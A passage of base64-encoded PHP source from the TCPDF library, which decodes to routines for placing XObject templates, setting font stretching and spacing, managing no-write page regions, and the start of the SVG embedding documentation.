XQgZGVmYXVsdCB2YWx1ZXMKCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHgpKSB7CgkJCSR4ID0gJHRoaXMtPng7CgkJfQoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkeSkpIHsKCQkJJHkgPSAkdGhpcy0+eTsKCQl9CgkJLy8gY2hlY2sgcGFnZSBmb3Igbm8td3JpdGUgcmVnaW9ucyBhbmQgYWRhcHQgcGFnZSBtYXJnaW5zIGlmIG5lY2Vzc2FyeQoJCWxpc3QoJHgsICR5KSA9ICR0aGlzLT5jaGVja1BhZ2VSZWdpb25zKCRoLCAkeCwgJHkpOwoJCSRvdyA9ICR0aGlzLT54b2JqZWN0c1skaWRdWyd3J107CgkJaWYgKCRvdyA8PSAwKSB7CgkJCSRvdyA9IDE7CgkJfQoJCSRvaCA9ICR0aGlzLT54b2JqZWN0c1skaWRdWydoJ107CgkJaWYgKCRvaCA8PSAwKSB7CgkJCSRvaCA9IDE7CgkJfQoJCS8vIGNhbGN1bGF0ZSB0ZW1wbGF0ZSB3aWR0aCBhbmQgaGVpZ2h0IG9uIGRvY3VtZW50CgkJaWYgKCgkdyA8PSAwKSBBTkQgKCRoIDw9IDApKSB7CgkJCSR3ID0gJG93OwoJCQkkaCA9ICRvaDsKCQl9IGVsc2VpZiAoJHcgPD0gMCkgewoJCQkkdyA9ICRoICogJG93IC8gJG9oOwoJCX0gZWxzZWlmICgkaCA8PSAwKSB7CgkJCSRoID0gJHcgKiAkb2ggLyAkb3c7CgkJfQoJCS8vIGZpdCB0aGUgdGVtcGxhdGUgb24gYXZhaWxhYmxlIHNwYWNlCgkJbGlzdCgkdywgJGgsICR4LCAkeSkgPSAkdGhpcy0+Zml0QmxvY2soJHcsICRoLCAkeCwgJHksICRmaXRvbnBhZ2UpOwoJCS8vIHNldCBwYWdlIGFsaWdubWVudAoJCSRyYl95ID0gJHkgKyAkaDsKCQkvLyBzZXQgYWxpZ25tZW50CgkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJaWYgKCRwYWxpZ24gPT0gJ0wnKSB7CgkJCQkkeHQgPSAkdGhpcy0+bE1hcmdpbjsKCQkJfSBlbHNlaWYgKCRwYWxpZ24gPT0gJ0MnKSB7CgkJCQkkeHQgPSAoJHRoaXMtPncgKyAkdGhpcy0+bE1hcmdpbiAtICR0aGlzLT5yTWFyZ2luIC0gJHcpIC8gMjsKCQkJfSBlbHNlaWYgKCRwYWxpZ24gPT0gJ1InKSB7CgkJCQkkeHQgPSAkdGhpcy0+dyAtICR0aGlzLT5yTWFyZ2luIC0gJHc7CgkJCX0gZWxzZSB7CgkJCQkkeHQgPSAkeCAtICR3OwoJCQl9CgkJCSRyYl94ID0gJHh0OwoJCX0gZWxzZSB7CgkJCWlmICgkcGFsaWduID09ICdMJykgewoJCQkJJHh0ID0gJHRoaXMtPmxNYXJnaW47CgkJCX0gZWxzZWlmICgkcGFsaWduID09ICdDJykgewoJCQkJJHh0ID0gKCR0aGlzLT53ICsgJHRoaXMtPmxNYXJnaW4gLSAkdGhpcy0+ck1hcmdpbiAtICR3KSAvIDI7CgkJCX0gZWxzZWlmICgkcGFsaWduID09ICdSJykgewoJCQkJJHh0ID0gJHRoaXMtPncgLSAkdGhpcy0+ck1hcmdpbiAtICR3OwoJCQl9IGVsc2UgewoJCQkJJHh0ID0gJHg7CgkJCX0KCQkJJHJiX3ggPSAkeHQgKyAkdzsKCQl9CgkJLy8gcHJpbnQgWE9iamVjdCBUZW1wbGF0ZSArIFRyYW5zZm9ybWF0aW9uIG1hdHJpeAoJCSR0aGlzLT5TdGFydFRyYW5zZm9ybSgpOwoJCS8vIHRyYW5zbGF0ZSBhbmQgc2NhbGUKCQkkc3ggPSAoJHcgLyAkb3cpOwoJCSRzeSA9ICgkaCAvICRvaCk7CgkJJHRtID0gYXJyYXkoKTsKCQkkdG1bMF0gPSAkc3g7CgkJJHRtWzFdID0gMDsKCQkkdG1bMl0gPSAwOwoJCSR0bVszXSA9ICRzeTsKCQkkdG1bNF0gPSAkeHQgKiAkdGhpcy0+azsKCQkkdG1bNV0gPSAoJHRoaXMtPmggLSAkaCAtICR5KSAqICR0aGlzLT5rOwoJCSR0aGlzLT5UcmFuc2Zvcm0oJHRtKTsKCQkvLyBzZXQgb2JqZWN0CgkJJHRoaXMtPl9vdXQoJy8nLiRpZC4nIERvJyk7CgkJJHRoaXMtPlN0b3BUcmFuc2Zvcm0oKTsKCQkvLyBhZGQgYW5ub3RhdGlvbnMKCQlpZiAoIWVtcHR5KCR0aGlzLT54b2JqZWN0c1skaWRdWydhbm5vdGF0aW9ucyddKSkgewoJCQlmb3JlYWNoICgkdGhpcy0+eG9iamVjdHNbJGlkXVsnYW5ub3RhdGlvbnMnXSBhcyAkYW5ub3QpIHsKCQkJCS8vIHRyYW5zZm9ybSBvcmlnaW5hbCBjb29yZGluYXRlcwoJCQkJJGNvb3JkbHQgPSBUQ1BERl9TVEFUSUM6OmdldFRyYW5zZm9ybWF0aW9uTWF0cml4UHJvZHVjdCgkdG0sIGFycmF5KDEsIDAsIDAsIDEsICgkYW5ub3RbJ3gnXSAqICR0aGlzLT5rKSwgKC0kYW5ub3RbJ3knXSAqICR0aGlzLT5rKSkpOwoJCQkJJGF4ID0gKCRjb29yZGx0WzRdIC8gJHRoaXMtPmspOwoJCQkJJGF5ID0gKCR0aGlzLT5oIC0gJGggLSAoJGNvb3JkbHRbNV0gLyAkdGhpcy0+aykpOwoJCQkJJGNvb3JkcmIgPSBUQ1BERl9TVEFUSUM6OmdldFRyYW5zZm9ybWF0aW9uTWF0cml4UHJvZHVjdCgkdG0sIGFycmF5KDEsIDAsIDAsIDEsICgoJGFubm90Wyd4J10gKyAkYW5ub3RbJ3cnXSkgKiAkdGhpcy0+ayksICgoLSRhbm5vdFsneSddIC0gJGFubm90WydoJ10pICogJHRoaXMtPmspKSk7CgkJCQkkYXcgPSAoJGNvb3JkcmJbNF0gLyAkdGhpcy0+aykgLSAkYXg7CgkJCQkkYWggPSAoJHRoaXMtPmggLSAkaCAtICgkY29vcmRyYls1XSAvICR0aGlzLT5rKSkgLSAkYXk7CgkJCQkkdGhpcy0+QW5ub3RhdGlvbigkYXgsICRheSwgJGF3LCAkYWgsICRhbm5vdFsndGV4dCddLCAkYW5ub3RbJ29wdCddLCAkYW5ub3RbJ3NwYWNlcyddKTsKCQkJfQoJCX0KCQkvLyBzZXQgcG9pbnRlciB0byBhbGlnbiB0aGUgbmV4dCB0ZXh0L29iamVjdHMKCQlzd2l0Y2goJGFsaWduKSB7CgkJCWNhc2UgJ1QnOiB7CgkJCQkkdGhpcy0+eSA9ICR5OwoJCQkJJHRoaXMtPnggPSAkcmJfeDsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ00nOiB7CgkJCQkkdGhpcy0+eSA9ICR5ICsgcm91bmQoJGgvMik7CgkJCQkkdGhpcy0+eCA9ICRyYl94OwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnQic6IHsKCQkJCSR0aGlzLT55ID0gJHJiX3k7CgkJCQkkdGhpcy0+eCA9ICRyYl94OwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnTic6IHsKCQkJCSR0aGlzLT5zZXRZKCRyYl95KTsKCQkJCWJyZWFrOwoJCQl9CgkJCWRlZmF1bHQ6ewoJCQkJYnJlYWs7CgkJCX0KCQl9Cgl9CgoJLyoqCgkgKiBTZXQgdGhlIHBlcmNlbnRhZ2Ugb2YgY2hhcmFjdGVyIHN0cmV0Y2hpbmcuCgkgKiBAcGFyYW0gaW50ICRwZXJjIHBlcmNlbnRhZ2Ugb2Ygc3RyZXRjaGluZyAoMTAwID0gbm8gc3RyZXRjaGluZykKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS45LjAwMCAoMjAxMC0wOS0yOSkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldEZvbnRTdHJldGNoaW5nKCRwZXJjPTEwMCkgewoJCSR0aGlzLT5mb250X3N0cmV0Y2hpbmcgPSAkcGVyYzsKCX0KCgkvKioKCSAqIEdldCB0aGUgcGVyY2VudGFnZSBvZiBjaGFyYWN0ZXIgc3RyZXRjaGluZy4KCSAqIEByZXR1cm4gZmxvYXQgc3RyZXRjaGluZyB2YWx1ZQoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA1LjkuMDAwICgyMDEwLTA5LTI5KQoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0Rm9udFN0cmV0Y2hpbmcoKSB7CgkJcmV0dXJuICR0aGlzLT5mb250X3N0cmV0Y2hpbmc7Cgl9CgoJLyoqCgkgKiBTZXQgdGhlIGFtb3VudCB0byBpbmNyZWFzZSBvciBkZWNyZWFzZSB0aGUgc3BhY2UgYmV0d2VlbiBjaGFyYWN0ZXJzIGluIGEgdGV4dC4KCSAqIEBwYXJhbSBmbG9hdCAkc3BhY2luZyBhbW91bnQgdG8gaW5jcmVhc2Ugb3IgZGVjcmVhc2UgdGhlIHNwYWNlIGJldHdlZW4gY2hhcmFjdGVycyBpbiBhIHRleHQgKDAgPSBkZWZhdWx0IHNwYWNpbmcpCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOS4wMDAgKDIwMTAtMDktMjkpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRGb250U3BhY2luZygkc3BhY2luZz0wKSB7CgkJJHRoaXMtPmZvbnRfc3BhY2luZyA9ICRzcGFjaW5nOwoJfQoKCS8qKgoJICogR2V0IHRoZSBhbW91bnQgdG8gaW5jcmVhc2Ugb3IgZGVjcmVhc2UgdGhlIHNwYWNlIGJldHdlZW4gY2hhcmFjdGVycyBpbiBhIHRleHQuCgkgKiBAcmV0dXJuIGludCBmb250IHNwYWNpbmcgKHRyYWNraW5nKSB2YWx1ZQoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA1LjkuMDAwICgyMDEwLTA5LTI5KQoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0Rm9udFNwYWNpbmcoKSB7CgkJcmV0dXJuICR0aGlzLT5mb250X3NwYWNpbmc7Cgl9CgoJLyoqCgkgKiBSZXR1cm4gYW4gYXJyYXkgb2Ygbm8td3JpdGUgcGFnZSByZWdpb25zCgkgKiBAcmV0dXJuIGFycmF5IG9mIG5vLXdyaXRlIHBhZ2UgcmVnaW9ucwoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA1LjkuMDAzICgyMDEwLTEwLTEzKQoJICogQHNlZSBzZXRQYWdlUmVnaW9ucygpLCBhZGRQYWdlUmVnaW9uKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldFBhZ2VSZWdpb25zKCkgewoJCXJldHVybiAkdGhpcy0+cGFnZV9yZWdpb25zOwoJfQoKCS8qKgoJICogU2V0IG5vLXdyaXRlIHJlZ2lvbnMgb24gcGFnZS4KCSAqIEEgbm8td3JpdGUgcmVnaW9uIGlzIGEgcG9ydGlvbiBvZiB0aGUgcGFnZSB3aXRoIGEgcmVjdGFuZ3VsYXIgb3IgdHJhcGV6aXVtIHNoYXBlIHRoYXQgd2lsbCBub3QgYmUgY292ZXJlZCB3aGVuIHdyaXRpbmcgdGV4dCBvciBodG1sIGNvZGUuCgkgKiBBIHJlZ2lvbiBpcyBhbHdheXMgYWxpZ25lZCBvbiB0aGUgbGVmdCBvciByaWdodCBzaWRlIG9mIHRoZSBwYWdlIGFkIGlzIGRlZmluZWQgdXNpbmcgYSB2ZXJ0aWNhbCBzZWdtZW50LgoJICogWW91IGNhbiBzZXQgbXVsdGlwbGUgcmVnaW9ucyBmb3IgdGhlIHNhbWUgcGFnZS4KCSAqIEBwYXJhbSBhcnJheSAkcmVnaW9ucyBhcnJheSBvZiBuby13cml0ZSByZWdpb25zLiBGb3IgZWFjaCByZWdpb24geW91IGNhbiBkZWZpbmUgYW4gYXJyYXkgYXMgZm9sbG93OiAoJ3BhZ2UnID0+IHBhZ2UgbnVtYmVyIG9yIGVtcHkgZm9yIGN1cnJlbnQgcGFnZSwgJ3h0JyA9PiBYIHRvcCwgJ3l0JyA9PiBZIHRvcCwgJ3hiJyA9PiBYIGJvdHRvbSwgJ3liJyA9PiBZIGJvdHRvbSwgJ3NpZGUnID0+IHBhZ2Ugc2lkZSAnTCcgPSBsZWZ0IG9yICdSJyA9IHJpZ2h0KS4gT21pdCB0aGlzIHBhcmFtZXRlciB0byByZW1vdmUgYWxsIHJlZ2lvbnMuCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOS4wMDMgKDIwMTAtMTAtMTMpCgkgKiBAc2VlIGFkZFBhZ2VSZWdpb24oKSwgZ2V0UGFnZVJlZ2lvbnMoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0UGFnZVJlZ2lvbnMoJHJlZ2lvbnM9YXJyYXkoKSkgewoJCS8vIGVtcHR5IGN1cnJlbnQgcmVnaW9ucyBhcnJheQoJCSR0aGlzLT5wYWdlX3JlZ2lvbnMgPSBhcnJheSgpOwoJCS8vIGFkZCByZWdpb25zCgkJZm9yZWFjaCAoJHJlZ2lvbnMgYXMgJGRhdGEpIHsKCQkJJHRoaXMtPmFkZFBhZ2VSZWdpb24oJGRhdGEpOwoJCX0KCX0KCgkvKioKCSAqIEFkZCBhIHNpbmdsZSBuby13cml0ZSByZWdpb24gb24gc2VsZWN0ZWQgcGFnZS4KCSAqIEEgbm8td3JpdGUgcmVnaW9uIGlzIGEgcG9ydGlvbiBvZiB0aGUgcGFnZSB3aXRoIGEgcmVjdGFuZ3VsYXIgb3IgdHJhcGV6aXVtIHNoYXBlIHRoYXQgd2lsbCBub3QgYmUgY292ZXJlZCB3aGVuIHdyaXRpbmcgdGV4dCBvciBodG1sIGNvZGUuCgkgKiBBIHJlZ2lvbiBpcyBhbHdheXMgYWxpZ25lZCBvbiB0aGUgbGVmdCBvciByaWdodCBzaWRlIG9mIHRoZSBwYWdlIGFkIGlzIGRlZmluZWQgdXNpbmcgYSB2ZXJ0aWNhbCBzZWdtZW50LgoJICogWW91IGNhbiBzZXQgbXVsdGlwbGUgcmVnaW9ucyBmb3IgdGhlIHNhbWUgcGFnZS4KCSAqIEBwYXJhbSBhcnJheSAkcmVnaW9uIGFycmF5IG9mIGEgc2luZ2xlIG5vLXdyaXRlIHJlZ2lvbiBhcnJheTogKCdwYWdlJyA9PiBwYWdlIG51bWJlciBvciBlbXB5IGZvciBjdXJyZW50IHBhZ2UsICd4dCcgPT4gWCB0b3AsICd5dCcgPT4gWSB0b3AsICd4YicgPT4gWCBib3R0b20sICd5YicgPT4gWSBib3R0b20sICdzaWRlJyA9PiBwYWdlIHNpZGUgJ0wnID0gbGVmdCBvciAnUicgPSByaWdodCkuCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOS4wMDMgKDIwMTAtMTAtMTMpCgkgKiBAc2VlIHNldFBhZ2VSZWdpb25zKCksIGdldFBhZ2VSZWdpb25zKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGFkZFBhZ2VSZWdpb24oJHJlZ2lvbikgewoJCWlmICghaXNzZXQoJHJlZ2lvblsncGFnZSddKSBPUiBlbXB0eSgkcmVnaW9uWydwYWdlJ10pKSB7CgkJCSRyZWdpb25bJ3BhZ2UnXSA9ICR0aGlzLT5wYWdlOwoJCX0KCQlpZiAoaXNzZXQoJHJlZ2lvblsneHQnXSkgQU5EIGlzc2V0KCRyZWdpb25bJ3hiJ10pIEFORCAoJHJlZ2lvblsneHQnXSA+IDApIEFORCAoJHJlZ2lvblsneGInXSA+IDApCgkJCUFORCBpc3NldCgkcmVnaW9uWyd5dCddKSAgQU5EIGlzc2V0KCRyZWdpb25bJ3liJ10pIEFORCAoJHJlZ2lvblsneXQnXSA+PSAwKSBBTkQgKCRyZWdpb25bJ3l0J10gPCAkcmVnaW9uWyd5YiddKQoJCQlBTkQgaXNzZXQoJHJlZ2lvblsnc2lkZSddKSBBTkQgKCgkcmVnaW9uWydzaWRlJ10gPT0gJ0wnKSBPUiAoJHJlZ2lvblsnc2lkZSddID09ICdSJykpKSB7CgkJCSR0aGlzLT5wYWdlX3JlZ2lvbnNbXSA9ICRyZWdpb247CgkJfQoJfQoKCS8qKgoJICogUmVtb3ZlIGEgc2luZ2xlIG5vLXdyaXRlIHJlZ2lvbi4KCSAqIEBwYXJhbSBpbnQgJGtleSByZWdpb24ga2V5CgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOS4wMDMgKDIwMTAtMTAtMTMpCgkgKiBAc2VlIHNldFBhZ2VSZWdpb25zKCksIGdldFBhZ2VSZWdpb25zKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHJlbW92ZVBhZ2VSZWdpb24oJGtleSkgewoJCWlmIChpc3NldCgkdGhpcy0+cGFnZV9yZWdpb25zWyRrZXldKSkgewoJCQl1bnNldCgkdGhpcy0+cGFnZV9yZWdpb25zWyRrZXldKTsKCQl9Cgl9CgoJLyoqCgkgKiBDaGVjayBwYWdlIGZvciBuby13cml0ZSByZWdpb25zIGFuZCBhZGFwdCBjdXJyZW50IGNvb3JkaW5hdGVzIGFuZCBwYWdlIG1hcmdpbnMgaWYgbmVjZXNzYXJ5LgoJICogQSBuby13cml0ZSByZWdpb24gaXMgYSBwb3J0aW9uIG9mIHRoZSBwYWdlIHdpdGggYSByZWN0YW5ndWxhciBvciB0cmFwZXppdW0gc2hhcGUgdGhhdCB3aWxsIG5vdCBiZSBjb3ZlcmVkIHdoZW4gd3JpdGluZyB0ZXh0IG9yIGh0bWwgY29kZS4KCSAqIEEgcmVnaW9uIGlzIGFsd2F5cyBhbGlnbmVkIG9uIHRoZSBsZWZ0IG9yIHJpZ2h0IHNpZGUgb2YgdGhlIHBhZ2UgYWQgaXMgZGVmaW5lZCB1c2luZyBhIHZlcnRpY2FsIHNlZ21lbnQuCgkgKiBAcGFyYW0gZmxvYXQgJGggaGVpZ2h0IG9mIHRoZSB0ZXh0L2ltYWdlL29iamVjdCB0byBwcmludCBpbiB1c2VyIHVuaXRzCgkgKiBAcGFyYW0gZmxvYXQgJHggY3VycmVudCBYIGNvb3JkaW5hdGUgaW4gdXNlciB1bml0cwoJICogQHBhcmFtIGZsb2F0ICR5IGN1cnJlbnQgWSBjb29yZGluYXRlIGluIHVzZXIgdW5pdHMKCSAqIEByZXR1cm4gZmxvYXRbXSBhcnJheSgkeCwgJHkpCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuOS4wMDMgKDIwMTAtMTAtMTMpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBjaGVja1BhZ2VSZWdpb25zKCRoLCAkeCwgJHkpIHsKCQkvLyBzZXQgZGVmYXVsdCB2YWx1ZXMKCQlpZiAoJHggPT09ICcnKSB7CgkJCSR4ID0gJHRoaXMtPng7CgkJfQoJCWlmICgkeSA9PT0gJycpIHsKCQkJJHkgPSAkdGhpcy0+eTsKCQl9CgkJaWYgKCEkdGhpcy0+Y2hlY2tfcGFnZV9yZWdpb25zIE9SIGVtcHR5KCR0aGlzLT5wYWdlX3JlZ2lvbnMpKSB7CgkJCS8vIG5vIHBhZ2UgcmVnaW9ucyBkZWZpbmVkCgkJCXJldHVybiBhcnJheSgkeCwgJHkpOwoJCX0KCQlpZiAoZW1wdHkoJGgpKSB7CgkJCSRoID0gJHRoaXMtPmdldENlbGxIZWlnaHQoJHRoaXMtPkZvbnRTaXplKTsKCQl9CgkJLy8gY2hlY2sgZm9yIHBhZ2UgYnJlYWsKCQlpZiAoJHRoaXMtPmNoZWNrUGFnZUJyZWFrKCRoLCAkeSkpIHsKCQkJLy8gdGhlIGNvbnRlbnQgd2lsbCBiZSBwcmludGVkIG9uIGEgbmV3IHBhZ2UKCQkJJHggPSAkdGhpcy0+eDsKCQkJJHkgPSAkdGhpcy0+eTsKCQl9CgkJaWYgKCR0aGlzLT5udW1fY29sdW1ucyA+IDEpIHsKCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCSR0aGlzLT5sTWFyZ2luID0gKCR0aGlzLT5jb2x1bW5zWyR0aGlzLT5jdXJyZW50X2NvbHVtbl1bJ3gnXSAtICR0aGlzLT5jb2x1bW5zWyR0aGlzLT5jdXJyZW50X2NvbHVtbl1bJ3cnXSk7CgkJCX0gZWxzZSB7CgkJCQkkdGhpcy0+ck1hcmdpbiA9ICgkdGhpcy0+dyAtICR0aGlzLT5jb2x1bW5zWyR0aGlzLT5jdXJyZW50X2NvbHVtbl1bJ3gnXSAtICR0aGlzLT5jb2x1bW5zWyR0aGlzLT5jdXJyZW50X2NvbHVtbl1bJ3cnXSk7CgkJCX0KCQl9IGVsc2UgewoJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJJHRoaXMtPmxNYXJnaW4gPSBtYXgoJHRoaXMtPmNsTWFyZ2luLCAkdGhpcy0+b3JpZ2luYWxfbE1hcmdpbik7CgkJCX0gZWxzZSB7CgkJCQkkdGhpcy0+ck1hcmdpbiA9IG1heCgkdGhpcy0+Y3JNYXJnaW4sICR0aGlzLT5vcmlnaW5hbF9yTWFyZ2luKTsKCQkJfQoJCX0KCQkvLyBhZGp1c3QgY29vcmRpbmF0ZXMgYW5kIHBhZ2UgbWFyZ2lucwoJCWZvcmVhY2ggKCR0aGlzLT5wYWdlX3JlZ2lvbnMgYXMgJHJlZ2lkID0+ICRyZWdkYXRhKSB7CgkJCWlmICgkcmVnZGF0YVsncGFnZSddID09ICR0aGlzLT5wYWdlKSB7CgkJCQkvLyBjaGVjayByZWdpb24gYm91bmRhcmllcwoJCQkJaWYgKCgkeSA+ICgkcmVnZGF0YVsneXQnXSAtICRoKSkgQU5EICgkeSA8PSAkcmVnZGF0YVsneWInXSkpIHsKCQkJCQkvLyBZIGlzIGluc2lkZSB0aGUgcmVnaW9uCgkJCQkJJG1pbnYgPSAoJHJlZ2RhdGFbJ3hiJ10gLSAkcmVnZGF0YVsneHQnXSkgLyAoJHJlZ2RhdGFbJ3liJ10gLSAkcmVnZGF0YVsneXQnXSk7IC8vIGludmVyc2Ugb2YgYW5ndWxhciBjb2VmZmljaWVudAoJCQkJCSR5dCA9IG1heCgkeSwgJHJlZ2RhdGFbJ3l0J10pOwoJCQkJCSR5YiA9IG1pbigoJHl0ICsgJGgpLCAkcmVnZGF0YVsneWInXSk7CgkJCQkJJHh0ID0gKCgkeXQgLSAkcmVnZGF0YVsneXQnXSkgKiAkbWludikgKyAkcmVnZGF0YVsneHQnXTsKCQkJCQkkeGIgPSAoKCR5YiAtICRyZWdkYXRhWyd5dCddKSAqICRtaW52KSArICRyZWdkYXRhWyd4dCddOwoJCQkJCWlmICgkcmVnZGF0YVsnc2lkZSddID09ICdMJykgeyAvLyBsZWZ0IHNpZGUKCQkJCQkJJG5ld19tYXJnaW4gPSBtYXgoJHh0LCAkeGIpOwoJCQkJCQlpZiAoJHRoaXMtPmxNYXJnaW4gPCAkbmV3X21hcmdpbikgewoJCQkJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkJCQkvLyBhZGp1c3QgbGVmdCBwYWdlIG1hcmdpbgoJCQkJCQkJCSR0aGlzLT5sTWFyZ2luID0gbWF4KDAsICRuZXdfbWFyZ2luKTsKCQkJCQkJCX0KCQkJCQkJCWlmICgkeCA8ICRuZXdfbWFyZ2luKSB7CgkJCQkJCQkJLy8gYWRqdXN0IHggcG9zaXRpb24KCQkJCQkJCQkkeCA9ICRuZXdfbWFyZ2luOwoJCQkJCQkJCWlmICgkbmV3X21hcmdpbiA+ICgkdGhpcy0+dyAtICR0aGlzLT5yTWFyZ2luKSkgewoJCQkJCQkJCQkvLyBhZGp1c3QgeSBwb3NpdGlvbgoJCQkJCQkJCQkkeSA9ICRyZWdkYXRhWyd5YiddIC0gJGg7CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJfSBlbHNlaWYgKCRyZWdkYXRhWydzaWRlJ10gPT0gJ1InKSB7IC8vIHJpZ2h0IHNpZGUKCQkJCQkJJG5ld19tYXJnaW4gPSBtaW4oJHh0LCAkeGIpOwoJCQkJCQlpZiAoKCR0aGlzLT53IC0gJHRoaXMtPnJNYXJnaW4pID4gJG5ld19tYXJnaW4pIHsKCQkJCQkJCWlmICghJHRoaXMtPnJ0bCkgewoJCQkJCQkJCS8vIGFkanVzdCByaWdodCBwYWdlIG1hcmdpbgoJCQkJCQkJCSR0aGlzLT5yTWFyZ2luID0gbWF4KDAsICgkdGhpcy0+dyAtICRuZXdfbWFyZ2luKSk7CgkJCQkJCQl9CgkJCQkJCQlpZiAoJHggPiAkbmV3X21hcmdpbikgewoJCQkJCQkJCS8vIGFkanVzdCB4IHBvc2l0aW9uCgkJCQkJCQkJJHggPSAkbmV3X21hcmdpbjsKCQkJCQkJCQlpZiAoJG5ld19tYXJnaW4gPiAkdGhpcy0+bE1hcmdpbikgewoJCQkJCQkJCQkvLyBhZGp1c3QgeSBwb3NpdGlvbgoJCQkJCQkJCQkkeSA9ICRyZWdkYXRhWyd5YiddIC0gJGg7CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJfQoJCQkJfQoJCQl9CgkJfQoJCXJldHVybiBhcnJheSgkeCwgJHkpOwoJfQoKCS8vIC0tLSBTVkcgTUVUSE9EUyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCgkvKioKCSAqIEVtYmVkZCBhIFNjYWxhYmxlIFZlY3RvciBHcmFwaGljcyAoU1ZHKSBpbWFnZS4KCSAqIE5PVEU6IFNWRyBzdGFuZGFyZCBpcyBub3QgeWV0IGZ1bGx5IGltcGxlbWVudGVkLCB1c2UgdGhlIHNldFJhc3Rlcml6ZVZlY3RvckltYWdlcygpIG1ldGhvZCB0byBlbmFibGUvZGlzYWJsZSByYXN0ZXJpemF0aW9uIG9mIHZlY3RvciBpbWFnZXMgdXNpbmcgSW1hZ2VNYWdpY2sgbGlicmFyeS4KCSAqIEBwYXJhbSBzdHJpbmcgJGZpbGUgTmFtZSBvZiB0aGUgU1ZHIGZpbGUgb3IgYSAnQCcgY2hhcmFjdGVyIGZvbGxvd2VkIGJ5IHRoZSBTVkcgZGF0YSBzdHJpbmcuCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkeCBBYnNjaXNzYSBvZiB0aGUgdXBwZXItbGVmdCBjb3JuZXIuCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkeSBPcmRpbmF0ZSBvZiB0aGUgdXBwZXItbGVmdCBjb3JuZXIuCgkgKiBAcGFyYW0gZmxvYXQgJHcgV2lkdGggb2YgdGhlIGltYWdlIGluIHRoZSBwYWdlLiBJZiBub3Qgc3BlY2lmaWVkIG9yIGVxdWFsIHRvIHplcm8sIGl0IGlzIGF1dG9tYXRpY2FsbHkgY2FsY3VsYXRlZC4KCSAqIEBwYXJhbSBmbG9hdCAkaCBIZWlnaHQgb2YgdGhlIGltYWdlIGluIHRoZSBwYWdlLiBJZiBub3Qgc3BlY2lmaWVkIG9yIGVxdWFsIHRvIHplcm8sIGl0IGlzIGF1dG9tYXRpY2FsbHkgY2FsY3VsYXRlZC4KCSAqIEBwYXJhbSBtaXhlZCAkbGluayBVUkwgb3IgaWRlbnRpZmllciByZXR1cm5lZCBieSBBZGRMaW5rKCkuCgkgKiBAcGFyYW0gc3RyaW5nICRhbGlnbiBJbmRpY2F0ZXMgdGhlIGFsaWdubWVudCBvZiB0aGUgcG9pbnRlciBuZXh0IHRvIGltYWdlIGluc2VydGlvbiByZWxhdGl2ZSB0byBpbWFnZSBoZWlnaHQuIFRoZSB2YWx1ZSBjYW4gYmU6PHVsPjxsaT5UOiB0b3AtcmlnaHQgZm9yIExUUiBvciB0b3AtbGVmdCBmb3IgUlRMPC9saT48bGk+TTogbWlkZGxlLXJpZ2h0IGZvciBMVFIgb3IgbWlkZGxlLWxlZnQgZm9yIFJUTDwvbGk+PGxpPkI6IGJvdHRvbS1yaWdodCBmb3IgTFRSIG9yIGJvdHRvbS1sZWZ0IGZvciBSVEw8L2xpPjxsaT5OOiBuZXh0IGxpbmU8L2xpPjwvdWw+IElmIHRoZSBhbGlnbm1lbnQgaXMgYW4gZW1wdHkgc3RyaW5nLCB0aGVuIHRoZSBwb2ludGVyIHdpbGwgYmUgcmVzdG9yZWQgb24gdGhlIHN0YXJ0aW5nIFNWRyBwb3NpdGlvbi4KCSAqIEBwYXJhbSBzdHJpbmcgJHBhbGlnbiBBbGxvd3MgdG8gY2VudGVyIG9yIGFsaWduIHRoZSBpbWFnZSBvbiB0aGUgY3VycmVudCBsaW5lLiBQb3NzaWJsZSB2YWx1ZXMgYXJlOjx1bD48bGk+TCA6IGxlZnQgYWxpZ248L2xpPjxsaT5DIDogY2VudGVyPC9saT48bGk+UiA6IHJpZ2h0IGFsaWduPC9saT48bGk+JycgOiBlbXB0eSBzdHJpbmcgOiBsZWZ0IGZvciBMVFIgb3IgcmlnaHQgZm9yIFJUTDwvbGk+PC91bD4KCSAqIEBwYXJhbSBtaXhlZCAkYm9y